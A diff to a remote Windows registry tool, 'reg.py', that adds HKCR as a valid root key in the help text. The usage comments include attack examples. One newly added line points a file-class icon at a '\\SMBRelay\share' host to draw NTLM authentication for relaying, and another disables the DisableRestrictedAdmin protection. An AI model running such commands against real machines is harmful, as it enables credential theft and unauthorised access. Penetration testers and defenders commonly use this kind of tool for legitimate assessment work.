@@ -15,6 +15,7 @@
 #       ./reg.py Administrator:password@targetMachine query -keyName HKLM\\Software\\Microsoft\\WBEM -s
 #       ./reg.py Administrator:password@targetMachine add -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v DisableRestrictedAdmin -vt REG_DWORD -vd 1
 #       ./reg.py Administrator:password@targetMachine add -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services\\NewService
+#       ./reg.py Administrator:password@targetMachine add -keyName HKCR\\hlpfile\\DefaultIcon  -v '' -vd '\\SMBRelay\share'
 #       ./reg.py Administrator:password@targetMachine delete -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v DisableRestrictedAdmin
 #
 # Author:
@@ -503,7 +504,7 @@ if __name__ == '__main__':
     query_parser.add_argument('-keyName', action='store', required=True,
                               help='Specifies the full path of the subkey. The '
                                    'keyName must include a valid root key. Valid root keys for the local computer are: HKLM,'
-                                   ' HKU.')
+                                   ' HKU, HKCR.')
     query_parser.add_argument('-v', action='store', metavar="VALUENAME", required=False, help='Specifies the registry '
                            'value name that is to be queried. If omitted, all value names for keyName are returned. ')
     query_parser.add_argument('-ve', action='store_true', default=False, required=False, help='Queries for the default '
@@ -516,7 +517,7 @@ if __name__ == '__main__':
     add_parser.add_argument('-keyName', action='store', required=True,
                               help='Specifies the full path of the subkey. The '
                                    'keyName must include a valid root key. Valid root keys for the local computer are: HKLM,'
-                                   ' HKU.')
+                                   ' HKU, HKCR.')
     add_parser.add_argument('-v', action='store', metavar="VALUENAME", required=False, help='Specifies the registry '
                            'value name that is to be set.')
     add_parser.add_argument('-vt', action='store', metavar="VALUETYPE", required=False, help='Specifies the registry '
@@ -531,7 +532,7 @@ if __name__ == '__main__':
     delete_parser.add_argument('-keyName', action='store', required=True,
                               help='Specifies the full path of the subkey. The '
                                    'keyName must include a valid root key. Valid root keys for the local computer are: HKLM,'
-                                   ' HKU.')
+                                   ' HKU, HKCR.')
     delete_parser.add_argument('-v', action='store', metavar="VALUENAME", required=False, help='Specifies the registry '
                            'value name that is to be deleted.')
     delete_parser.add_argument('-va', action='store_true', required=False, help='Delete all values under this key.')
